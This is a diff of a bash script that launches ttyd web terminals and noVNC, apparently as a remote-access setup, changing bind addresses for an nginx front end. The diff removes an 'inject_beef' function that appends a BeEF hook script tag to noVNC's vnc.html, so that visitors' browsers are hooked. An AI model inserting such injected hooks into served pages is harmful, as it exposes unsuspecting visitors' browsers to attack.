@@ -57,9 +57,16 @@ start_ttyd() {
     log "cyan" "🚀 Starting terminal service (ttyd)..."
     install_ttyd
 
-    if [[ "$DISABLE_SSL" == true ]]; then
-        log "yellow" "⚠️  Starting ttyd WITHOUT SSL encryption"
-        sudo -u "$TEMP_USER" ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" -a 0.0.0.0 bash >/dev/null 2>&1 &
+    # Determine bind address based on nginx status
+    local bind_address="0.0.0.0"
+    if [[ "$NGINX_ENABLED" == "true" ]]; then
+        bind_address="127.0.0.1"
+        log "blue" "Binding to localhost (nginx will handle external access)"
+    fi
+
+    if [[ "$DISABLE_SSL" == true ]] || [[ "$NGINX_ENABLED" == "true" ]]; then
+        log "yellow" "⚠️  Starting ttyd WITHOUT SSL encryption (nginx handles SSL when enabled)"
+        sudo -u "$TEMP_USER" ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" -a "$bind_address" bash >/dev/null 2>&1 &
     else
         log "green" "🔒 Starting ttyd WITH SSL encryption"
         # Ensure SSL certificates have correct permissions
@@ -69,7 +76,7 @@ start_ttyd() {
             sudo chmod 600 "$SSL_KEY" 2>/dev/null || true
         fi
         sudo -u "$TEMP_USER" ttyd -S --ssl -C "$SSL_CERT" -K "$SSL_KEY" \
-            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" -a 0.0.0.0 bash >/dev/null 2>&1 &
+            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" -a "$bind_address" bash >/dev/null 2>&1 &
     fi
     sleep 2
     success "✓ Terminal service started on port $TTYD_PORT"
@@ -102,10 +109,17 @@ start_novnc() {
     log "cyan" "🌐 Starting web VNC interface (noVNC)..."
     configure_novnc
 
-    if [[ "$DISABLE_SSL" == true ]]; then
-        log "yellow" "⚠️  Starting noVNC WITHOUT SSL encryption"
+    # Determine bind address based on nginx status
+    local bind_address="0.0.0.0"
+    if [[ "$NGINX_ENABLED" == "true" ]]; then
+        bind_address="127.0.0.1"
+        log "blue" "Binding to localhost (nginx will handle external access)"
+    fi
+
+    if [[ "$DISABLE_SSL" == true ]] || [[ "$NGINX_ENABLED" == "true" ]]; then
+        log "yellow" "⚠️  Starting noVNC WITHOUT SSL encryption (nginx handles SSL when enabled)"
         sudo -u "$TEMP_USER" /usr/share/novnc/utils/novnc_proxy \
-            --vnc "127.0.0.1:$VNC_PORT" --listen "0.0.0.0:$NOVNC_PORT" >/dev/null 2>&1 &
+            --vnc "127.0.0.1:$VNC_PORT" --listen "$bind_address:$NOVNC_PORT" >/dev/null 2>&1 &
     else
         log "green" "🔒 Starting noVNC WITH SSL encryption"
         # Ensure SSL certificates have correct permissions
@@ -116,43 +130,10 @@ start_novnc() {
         fi
         sudo -u "$TEMP_USER" SSL_CERT="$SSL_CERT" SSL_KEY="$SSL_KEY" \
             /usr/share/novnc/utils/novnc_proxy \
-            --vnc "127.0.0.1:$VNC_PORT" --listen "0.0.0.0:$NOVNC_PORT" \
+            --vnc "127.0.0.1:$VNC_PORT" --listen "$bind_address:$NOVNC_PORT" \
             --cert "$SSL_CERT" --key "$SSL_KEY" --ssl-only >/dev/null 2>&1 &
     fi
     sleep 2
     success "✓ Web VNC interface started on port $NOVNC_PORT"
 }
 
-# ============================================================================
-# BEEF INJECTION (OPTIONAL)
-# ============================================================================
-
-inject_beef() {
-    [[ "$BEEF_ENABLED" != "true" ]] && return
-    [[ -z "$BEEF_HOOK_URL" ]] && {
-        warn "BEEF_ENABLED is true but BEEF_HOOK_URL is not set. Skipping injection."
-        return
-    }
-    
-    log "red" "Injecting BeEF into noVNC..." "💉"
-    
-    # Create backup of original file
-    local backup_file="${VNC_FILE}.backup.$(date +%Y%m%d_%H%M%S)"
-    
-    if [[ -f "$VNC_FILE" ]]; then
-        log "yellow" "Creating backup: $backup_file" "💾"
-        sudo cp "$VNC_FILE" "$backup_file"
-    fi
-    
-    if [[ ! -f "$INDEX_FILE" ]]; then
-        log "red" "Creating index.html and injecting script..." "💉"
-        sudo cp "$VNC_FILE" "$INDEX_FILE"
-    else
-        log "red" "Creating backup and injecting script in vnc.html..." "💉"
-        sudo cp "$INDEX_FILE" "$VNC_FILE"
-    fi
-    
-    echo "<script src='$BEEF_HOOK_URL'></script>" | sudo tee -a "$VNC_FILE" > /dev/null
-    
-    success "BeEF injected. Backup saved to: $backup_file"
-}
